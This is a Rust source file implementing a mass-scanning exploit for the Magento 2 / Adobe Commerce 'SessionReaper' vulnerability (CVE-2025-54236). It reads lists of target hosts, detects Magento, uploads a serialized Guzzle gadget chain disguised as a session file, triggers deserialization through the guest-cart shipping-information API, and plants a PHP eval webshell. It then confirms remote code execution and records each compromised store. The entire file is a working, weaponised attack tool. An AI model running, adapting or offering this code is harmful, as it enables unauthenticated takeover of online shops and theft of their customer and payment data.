/*
 * SessionReaper — CVE-2025-54236 PoC (Rust)
 * Magento 2 / Adobe Commerce Unauthenticated RCE
 * Via DI Traversal + File-Based Session Poisoning
 *
 * Rust conversion: mass-scan version with Shodan IP list support
 *
 * Attack Chain:
 *   1. Scrape form_key from login/register page
 *   2. Upload Guzzle/FW1 gadget chain payload as a fake session file
 *   3. Trigger DI traversal via REST API shipping-information
 *   4. PHP loads poisoned session → Guzzle destructor fires → webshell dropped
 *   5. Verify RCE via the dropped shell
 */

use colored::*;
use rand::Rng;
use regex::Regex;
use reqwest::header::{ACCEPT, CONTENT_TYPE, USER_AGENT};
use serde_json::json;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::Duration;

use crate::common::{build_client_pool, pick_client, random_user_agent, save_content};

// ─── Constants ───────────────────────────────────────────────────────────────

const DEFAULT_THREADS: usize = 10;
const DEFAULT_STORE_CODE: &str = "default";
const BATCH_SIZE: usize = 5_000;

/// Pages that reliably contain form_key
const FORMKEY_PAGES: &[&str] = &[
    "/customer/account/login",
    "/customer/account/create",
    "/checkout/cart",
    "/",
];

/// Regex patterns for form_key extraction
const FORMKEY_PATTERNS: &[&str] = &[
    r#"["']formKey["']\s*:\s*["']([a-zA-Z0-9]+)["']"#,
    r#"<input[^>]+name=["']form_key["'][^>]+value=["']([a-zA-Z0-9]+)["']"#,
    r#"<input[^>]+value=["']([a-zA-Z0-9]+)["'][^>]+name=["']form_key["']"#,
    r#"FORM_KEY\s*[=:]\s*["']([a-zA-Z0-9]+)["']"#,
    r#""formKey"\s*:\s*"([a-zA-Z0-9]+)""#,
    r#"var\s+FORM_KEY\s*=\s*'([a-zA-Z0-9]+)'"#,
];

/// Common Magento webroot paths to try if relative path fails
const WEBROOT_GUESSES: &[&str] = &[
    "/var/www/html",
    "/var/www/magento",
    "/var/www",
    "/srv/www/html",
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn rand_str(length: usize) -> String {
    let charset = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| charset[rng.gen_range(0..charset.len())] as char)
        .collect()
}

fn rand_hex(length: usize) -> String {
    let charset = b"0123456789abcdef";
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| charset[rng.gen_range(0..charset.len())] as char)
        .collect()
}

fn normalize_url(raw: &str) -> String {
    let trimmed = raw.trim();
    if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        trimmed.trim_end_matches('/').to_string()
    } else {
        format!("http://{}", trimmed.trim_end_matches('/'))
    }
}

fn api_url(base: &str, store_code: &str, path: &str) -> String {
    format!("{}/rest/{}{}", base, store_code, path)
}

// ─── Phase 1: Extract form_key ──────────────────────────────────────────────

async fn get_form_key(client: &reqwest::Client, base_url: &str, ua: &str) -> Option<String> {
    let compiled: Vec<Regex> = FORMKEY_PATTERNS
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect();

    for page in FORMKEY_PAGES {
        let url = format!("{}{}", base_url, page);
        let res = client
            .get(&url)
            .header(USER_AGENT, ua)
            .timeout(Duration::from_secs(15))
            .send()
            .await;

        if let Ok(resp) = res {
            if resp.status().as_u16() != 200 {
                continue;
            }
            let text = resp.text().await.unwrap_or_default();
            for re in &compiled {
                if let Some(cap) = re.captures(&text) {
                    if let Some(m) = cap.get(1) {
                        return Some(m.as_str().to_string());
                    }
                }
            }
        }
    }

    // Fallback: try /admin
    let admin_url = format!("{}/admin", base_url);
    if let Ok(resp) = client
        .get(&admin_url)
        .header(USER_AGENT, ua)
        .timeout(Duration::from_secs(10))
        .send()
        .await
    {
        let text = resp.text().await.unwrap_or_default();
        for re in &compiled {
            if let Some(cap) = re.captures(&text) {
                if let Some(m) = cap.get(1) {
                    return Some(m.as_str().to_string());
                }
            }
        }
    }

    None
}

// ─── PHP Serialization Helpers ──────────────────────────────────────────────

/// Write a PHP serialized string value: s:LEN:"VALUE";
fn php_ser_str(buf: &mut Vec<u8>, value: &str) {
    buf.extend_from_slice(format!("s:{}:\"", value.len()).as_bytes());
    buf.extend_from_slice(value.as_bytes());
    buf.extend_from_slice(b"\";");
}

/// Write a PHP serialized string key + string value pair
fn php_ser_kv(buf: &mut Vec<u8>, key: &str, value: &str) {
    php_ser_str(buf, key);
    php_ser_str(buf, value);
}

/// Write a PHP serialized private property header: s:LEN:"\0ClassName\0propName";
fn php_ser_private_prop(buf: &mut Vec<u8>, class: &str, prop: &str) {
    let len = 1 + class.len() + 1 + prop.len();
    buf.extend_from_slice(format!("s:{}:\"", len).as_bytes());
    buf.push(0u8);
    buf.extend_from_slice(class.as_bytes());
    buf.push(0u8);
    buf.extend_from_slice(prop.as_bytes());
    buf.extend_from_slice(b"\";");
}

// ─── Phase 2: Generate Guzzle/FW1 payload (pure Rust, no phpggc) ────────────

/// Build a PHP serialized Guzzle/FW1 gadget chain entirely in Rust.
///
/// Chain: FileCookieJar::__destruct() → save(filename) → file_put_contents()
///
/// The PHP shell code is embedded inside a SetCookie value. When PHP
/// deserializes the session and the FileCookieJar object is destroyed,
/// it writes JSON-encoded cookie data (containing our shell between
/// <?php ?> tags) to the target file. PHP executes the <?php ?> block
/// regardless of surrounding JSON content.
fn generate_payload(target_file: &str, php_stub: &str) -> Vec<u8> {
    // ── SetCookie.data array ──
    let mut data_arr = Vec::new();
    data_arr.extend_from_slice(b"a:9:{");
    php_ser_kv(&mut data_arr, "Name", "x");
    php_ser_kv(&mut data_arr, "Value", php_stub);
    php_ser_kv(&mut data_arr, "Domain", ".");
    php_ser_kv(&mut data_arr, "Path", "/");
    data_arr.extend_from_slice(b"s:7:\"Max-Age\";N;");
    data_arr.extend_from_slice(b"s:7:\"Expires\";i:9999999999;");
    data_arr.extend_from_slice(b"s:6:\"Secure\";b:0;");
    data_arr.extend_from_slice(b"s:7:\"Discard\";b:0;");
    data_arr.extend_from_slice(b"s:8:\"HttpOnly\";b:0;");
    data_arr.extend_from_slice(b"}");

    // ── SetCookie object ──
    let mut set_cookie = Vec::new();
    set_cookie.extend_from_slice(b"O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{");
    php_ser_private_prop(&mut set_cookie, "GuzzleHttp\\Cookie\\SetCookie", "data");
    set_cookie.extend_from_slice(&data_arr);
    set_cookie.extend_from_slice(b"}");

    // ── FileCookieJar object (extends CookieJar) ──
    let mut obj = Vec::new();
    obj.extend_from_slice(b"O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{");

    // filename (private in FileCookieJar)
    php_ser_private_prop(&mut obj, "GuzzleHttp\\Cookie\\FileCookieJar", "filename");
    php_ser_str(&mut obj, target_file);

    // storeSessionCookies = true (private in FileCookieJar)
    php_ser_private_prop(&mut obj, "GuzzleHttp\\Cookie\\FileCookieJar", "storeSessionCookies");
    obj.extend_from_slice(b"b:1;");

    // cookies array (private in CookieJar parent)
    php_ser_private_prop(&mut obj, "GuzzleHttp\\Cookie\\CookieJar", "cookies");
    obj.extend_from_slice(b"a:1:{i:0;");
    obj.extend_from_slice(&set_cookie);
    obj.extend_from_slice(b"}");

    // strictMode = false (private in CookieJar parent)
    php_ser_private_prop(&mut obj, "GuzzleHttp\\Cookie\\CookieJar", "strictMode");
    obj.extend_from_slice(b"b:0;");

    obj.extend_from_slice(b"}");

    // Prefix with "_|" for valid PHP session format
    let mut payload = b"_|".to_vec();
    payload.extend_from_slice(&obj);
    payload
}

// ─── Phase 3: Upload session file ───────────────────────────────────────────

async fn upload_session_file(
    client: &reqwest::Client,
    base_url: &str,
    form_key: &str,
    session_id: &str,
    payload_bytes: &[u8],
    ua: &str,
) -> Option<String> {
    let filename = format!("sess_{}", session_id);
    let url = format!("{}/customer/address_file/upload", base_url);

    let file_part = reqwest::multipart::Part::bytes(payload_bytes.to_vec())
        .file_name(filename.clone())
        .mime_str("application/octet-stream")
        .ok()?;

    let form = reqwest::multipart::Form::new()
        .text("form_key", form_key.to_string())
        .part("custom_attributes[country_id]", file_part);

    let res = client
        .post(&url)
        .header(USER_AGENT, ua)
        .multipart(form)
        .timeout(Duration::from_secs(20))
        .send()
        .await
        .ok()?;

    let status = res.status().as_u16();

    if status == 200 {
        let text = res.text().await.unwrap_or_default();

        // Try parsing JSON response for file path
        if let Ok(val) = serde_json::from_str::<serde_json::Value>(&text) {
            if let Some(file_path) = val.get("file").and_then(|v| v.as_str()) {
                return Some(file_path.to_string());
            }
        }

        // Infer standard Magento media path structure
        let h1 = &filename[0..1];
        let h2 = if filename.len() > 1 {
            &filename[1..2]
        } else {
            h1
        };
        return Some(format!("/{}/{}/{}", h1, h2, filename));
    }

    None
}

// ─── Phase 4: Create guest cart ─────────────────────────────────────────────

async fn create_guest_cart(
    client: &reqwest::Client,
    base_url: &str,
    store_code: &str,
    ua: &str,
) -> String {
    let url = api_url(base_url, store_code, "/V1/guest-carts");

    if let Ok(resp) = client
        .post(&url)
        .header(CONTENT_TYPE, "application/json")
        .header(ACCEPT, "application/json")
        .header(USER_AGENT, ua)
        .timeout(Duration::from_secs(10))
        .send()
        .await
    {
        if resp.status().as_u16() == 200 {
            let text = resp.text().await.unwrap_or_default();
            let cart_id = text.trim().trim_matches('"').to_string();
            if cart_id.len() > 5 {
                return cart_id;
            }
        }
    }

    // Fallback: random cart ID — DI fires before cart validation
    rand_hex(32)
}

// ─── Phase 4: Trigger DI traversal ─────────────────────────────────────────

async fn trigger_deserialization(
    client: &reqwest::Client,
    base_url: &str,
    store_code: &str,
    session_id: &str,
    save_path: &str,
    cart_id: &str,
    ua: &str,
) {
    let url = api_url(
        base_url,
        store_code,
        &format!("/V1/guest-carts/{}/shipping-information", cart_id),
    );

    let payload = json!({
        "addressInformation": {
            "shipping_address": {
                "customer_session": {
                    "session_config": {
                        "save_path": save_path
                    }
                }
            },
            "billing_address": {},
            "shipping_carrier_code": "flatrate",
            "shipping_method_code": "flatrate"
        }
    });

    let cookie_val = format!("PHPSESSID={}", session_id);

    let _ = client
        .post(&url)
        .header(CONTENT_TYPE, "application/json")
        .header(ACCEPT, "application/json")
        .header(USER_AGENT, ua)
        .header("Cookie", &cookie_val)
        .json(&payload)
        .timeout(Duration::from_secs(20))
        .send()
        .await;
}

// ─── Phase 5: Verify RCE ───────────────────────────────────────────────────

async fn verify_rce(
    client: &reqwest::Client,
    shell_url: &str,
    post_param: &str,
) -> bool {
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(b"echo 'DCT_RCE_OK';");

    let params = [(post_param, &encoded)];
    if let Ok(resp) = client
        .post(shell_url)
        .form(&params)
        .timeout(Duration::from_secs(12))
        .send()
        .await
    {
        let text = resp.text().await.unwrap_or_default();
        return text.contains("DCT_RCE_OK");
    }
    false
}

// ─── Full exploit chain for a single target ─────────────────────────────────

async fn exploit_single(
    client: &reqwest::Client,
    base_url: &str,
    store_code: &str,
    webroot: &Option<String>,
    ua: &str,
) -> bool {
    // Phase 1: form_key
    let form_key = match get_form_key(client, base_url, ua).await {
        Some(fk) => fk,
        None => {
            return false;
        }
    };

    // Setup
    let session_id = rand_hex(32);
    let shell_name = format!("{}.php", rand_str(6));
    let post_param = rand_str(5);
    let php_stub = format!(
        "<?php @eval(base64_decode($_POST['{}'])); ?>",
        post_param
    );
    let shell_target = format!("pub/{}", shell_name);

    // Phase 2: Generate payload (pure Rust, no phpggc needed)
    let payload_bytes = generate_payload(&shell_target, &php_stub);

    // Phase 3: Upload session file
    let uploaded_path = match upload_session_file(
        client, base_url, &form_key, &session_id, &payload_bytes, ua,
    )
    .await
    {
        Some(p) => p,
        None => {
            return false;
        }
    };

    // Build save_path
    let upload_dir = uploaded_path
        .rsplit_once('/')
        .map(|(dir, _)| dir.to_string())
        .unwrap_or_default();

    // Phase 4: Create guest cart
    let cart_id = create_guest_cart(client, base_url, store_code, ua).await;

    // Try relative path first, then absolute paths
    let mut save_paths: Vec<String> = Vec::new();

    if let Some(ref wr) = webroot {
        save_paths.push(format!(
            "{}/pub/media/customer_address{}",
            wr.trim_end_matches('/'),
            upload_dir
        ));
    } else {
        save_paths.push(format!("pub/media/customer_address{}", upload_dir));
        for guess in WEBROOT_GUESSES {
            save_paths.push(format!(
                "{}/pub/media/customer_address{}",
                guess, upload_dir
            ));
        }
    }

    let shell_url = format!("{}/pub/{}", base_url, shell_name);

    for save_path in &save_paths {
        // Trigger DI traversal
        trigger_deserialization(
            client,
            base_url,
            store_code,
            &session_id,
            save_path,
            &cart_id,
            ua,
        )
        .await;

        // Verify RCE
        if verify_rce(client, &shell_url, &post_param).await {
            return true;
        }
    }

    false
}

// ─── Process a single target (with logging) ─────────────────────────────────

async fn process_target(
    client: reqwest::Client,
    raw_url: String,
    store_code: String,
    webroot: Option<String>,
    user_agents: Arc<Vec<String>>,
    processed: Arc<AtomicU64>,
    total: u64,
) {
    let base_url = normalize_url(&raw_url);
    let ua = random_user_agent(&user_agents);
    let current = processed.fetch_add(1, Ordering::Relaxed) + 1;

    // Quick Magento fingerprint check
    let is_magento = match client
        .get(&base_url)
        .header(USER_AGENT, &ua)
        .timeout(Duration::from_secs(10))
        .send()
        .await
    {
        Ok(resp) => {
            let text = resp.text().await.unwrap_or_default();
            text.contains("Mage.")
                || text.contains("mage-")
                || text.contains("magento")
                || text.contains("Magento")
        }
        Err(e) => {
            let msg = if e.is_timeout() {
                "Timeout"
            } else if e.is_connect() {
                "Connection Error"
            } else {
                "Error"
            };
            println!(
                "[{}/{}] [{}] {} => {}",
                current,
                total,
                "-".red(),
                base_url,
                msg.red()
            );
            return;
        }
    };

    if !is_magento {
        println!(
            "[{}/{}] [{}] {} => {}",
            current,
            total,
            "-".yellow(),
            base_url,
            "Not Magento".yellow()
        );
        return;
    }

    println!(
        "[{}/{}] [{}] {} => {}",
        current,
        total,
        "*".cyan(),
        base_url,
        "Magento detected, exploiting...".cyan()
    );

    let success = exploit_single(&client, &base_url, &store_code, &webroot, &ua).await;

    if success {
        println!(
            "[{}/{}] [{}] {} => {}",
            current,
            total,
            "!".green().bold(),
            base_url,
            "RCE CONFIRMED".green().bold()
        );
        save_content(
            "good_magento.txt",
            &format!("{} | RCE_CONFIRMED", base_url),
        )
        .await;
    } else {
        println!(
            "[{}/{}] [{}] {} => {}",
            current,
            total,
            "-".red(),
            base_url,
            "Failed / Not Vulnerable".red()
        );
    }

    // Save Magento targets regardless
    save_content("magento_targets.txt", &base_url).await;
}

// ─── Process a batch ────────────────────────────────────────────────────────

async fn process_batch(
    batch: Vec<String>,
    thread_count: usize,
    store_code: &str,
    webroot: &Option<String>,
    user_agents: &Arc<Vec<String>>,
    processed: &Arc<AtomicU64>,
    total: u64,
    client_pool: &[reqwest::Client],
) {
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let store_code = Arc::new(store_code.to_string());
    let webroot = Arc::new(webroot.clone());

    let mut handles = Vec::with_capacity(batch.len());

    for (i, url) in batch.into_iter().enumerate() {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let client = pick_client(client_pool, i);
        let sc = store_code.clone();
        let wr = webroot.clone();
        let uas = user_agents.clone();
        let proc_clone = processed.clone();

        let handle = tokio::spawn(async move {
            process_target(client, url, (*sc).clone(), (*wr).clone(), uas, proc_clone, total)
                .await;
            drop(permit);
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }
}

// ─── Count lines ────────────────────────────────────────────────────────────

fn count_lines(path: &str) -> u64 {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return 0,
    };
    BufReader::new(file).lines().count() as u64
}

// ─── Public Entry Point ─────────────────────────────────────────────────────

pub async fn run(user_agents: Arc<Vec<String>>) {
    println!(
        "{} | {}",
        "MAGENTO".yellow(),
        "CVE-2025-54236 SessionReaper".yellow()
    );
    println!();

    let stdin = io::stdin();

    print!("- Target List (txt) : ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("- Store Code [default: {}] : ", DEFAULT_STORE_CODE);
    io::stdout().flush().unwrap();
    let mut store_input = String::new();
    stdin.lock().read_line(&mut store_input).unwrap();
    let store_code = if store_input.trim().is_empty() {
        DEFAULT_STORE_CODE.to_string()
    } else {
        store_input.trim().to_string()
    };

    print!("- Webroot (optional, e.g. /var/www/html) : ");
    io::stdout().flush().unwrap();
    let mut webroot_input = String::new();
    stdin.lock().read_line(&mut webroot_input).unwrap();
    let webroot: Option<String> = if webroot_input.trim().is_empty() {
        None
    } else {
        Some(webroot_input.trim().to_string())
    };

    print!("- Thread [default: {}] : ", DEFAULT_THREADS);
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(DEFAULT_THREADS);

    print!("- Batch size [default: {}] : ", BATCH_SIZE);
    io::stdout().flush().unwrap();
    let mut batch_input = String::new();
    stdin.lock().read_line(&mut batch_input).unwrap();
    let batch_size: usize = batch_input.trim().parse().unwrap_or(BATCH_SIZE);

    // Build client pool
    let pool_size = thread_count.min(200);
    let client_pool = build_client_pool(pool_size);

    // Count total lines
    eprint!("{}", "[*] Counting targets... ".cyan());
    let total_lines = count_lines(&list_path);
    eprintln!("{}", format!("{} targets found", total_lines).green());

    if total_lines == 0 {
        eprintln!("{}", "No targets found in file.".red());
        return;
    }

    // Open file for streaming
    let file = match std::fs::File::open(&list_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{}", format!("Failed to read target file: {}", e).red());
            return;
        }
    };

    let reader = BufReader::with_capacity(8 * 1024 * 1024, file);

    eprintln!(
        "{}",
        format!(
            "[*] Streaming: batch_size={}, threads={}, store_code='{}', webroot={:?}",
            batch_size, thread_count, store_code, webroot
        )
        .green()
    );

    let processed = Arc::new(AtomicU64::new(0));
    let mut batch: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_num: u64 = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        batch.push(trimmed);

        if batch.len() >= batch_size {
            batch_num += 1;
            eprintln!(
                "{}",
                format!(
                    "[*] Processing batch #{} ({} targets)...",
                    batch_num,
                    batch.len()
                )
                .cyan()
            );

            process_batch(
                std::mem::take(&mut batch),
                thread_count,
                &store_code,
                &webroot,
                &user_agents,
                &processed,
                total_lines,
                &client_pool,
            )
            .await;

            batch = Vec::with_capacity(batch_size);
        }
    }

    // Process remaining
    if !batch.is_empty() {
        batch_num += 1;
        eprintln!(
            "{}",
            format!(
                "[*] Processing batch #{} ({} targets)...",
                batch_num,
                batch.len()
            )
            .cyan()
        );

        process_batch(
            batch,
            thread_count,
            &store_code,
            &webroot,
            &user_agents,
            &processed,
            total_lines,
            &client_pool,
        )
        .await;
    }

    eprintln!(
        "\n{}",
        "[*] Done. Results saved to good_magento.txt / magento_targets.txt".green()
    );
}
